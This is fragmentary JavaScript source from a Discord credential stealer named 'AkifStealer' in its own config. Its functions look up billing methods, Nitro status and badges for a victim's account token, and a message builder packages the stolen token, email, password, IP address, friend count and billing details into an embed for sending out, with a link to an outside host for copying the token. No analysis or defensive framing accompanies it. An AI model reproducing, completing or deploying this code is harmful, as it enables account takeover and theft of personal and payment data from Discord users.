...
const config = {
  ...
  ping_on_run: false, 
  ping_val: '@everyone', 
  embed_name: 'AkifStealer', 
  embed_icon: 'https://cdn.discordapp.com/attachments/944921950961143889/987335133214408744/Akif.gif',
  embed_color: 36393f, 
...
const getBilling = async (token) => {
  ...
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '<:akif:940000520582619147> ';
          break;
        case 2:
          billing += '<:akif:940184862940332103> ';
          break;
      }
    }
  });
...
const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return '';
    case 1:
      return '<:nitro:940000520989442089> ';
    case 2:
      return '<:nitroboost:987332846781874236> ';
    default:
      return '';
  }
};
...
const getBadges = (flags) => {
  ...
  switch (flags) {
    case 1:
      badges += '<:discord_staff:960870771016745030> ';
      break;
    case 2:
      badges += '<:partner:960871220457394256> ';
      break;
    case 131072:
      badges += '<:early_verified_bot_developer:960872690430910506> ';
      break;
    case 4:
      badges += '<:hypesquad_events:960872040913592370> ';
      break;
    case 16384:
      badges += '<:bughunter_2:960872690485452820> ';
      break;
    case 8:
      badges += '<:bughunter_1:960872690426707968> ';
      break;
    case 512:
      badges += '<:early_supporter:960872690447691836> ';
      break;
    case 128:
      badges += '<:hypesquad_briliance:960871616965922827> ';
      break;
    case 64:
      badges += '<:hypesquad_bravery:960871617033015366> ';
      break;
    case 256:
      badges += '<:hypesquad_balance:960871617284694046> ';
      break;
    case 0:
      badges = '`No Badges`';
      break;
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<a:akif:939849295803347035> Token:',
            value: `\`${token}\` Copy Token(https://superfurrycdn.nl/copy/{token})`,
            inline: false,
          },
          {
            name: '<:akif:947263456694902825> Badges:',
            value: `${badges}`,
            inline: true,
          },
          {
            name: '<a:akif:947263456774594591> Billing:',
            value: `**${billing}**`,
            inline: true,
          },
          {
            name: '<:akif:947263457395355648> Friends:',
            value: `\`${friends}\``,
            inline: true,
          },
          {
            name: '<:akif:947263457395355648> Email:',
            value: `\`${email}\``,
            inline: true,
          },
          {
            name: '<:akif:947263456967536650> IP:',
            value: `\`${config.ip}\``,
            inline: true,
          },
          {
            name: '<a:akif:947263456720093235> Password:',
            value: `\`${password}\``,
            inline: true,
          },
        ],
        ...
        thumbnail: {
          url: 'https://cdn.discordapp.com/attachments/944921950961143889/987335133214408744/Akif.gif',
        },
      },
    ],
  };
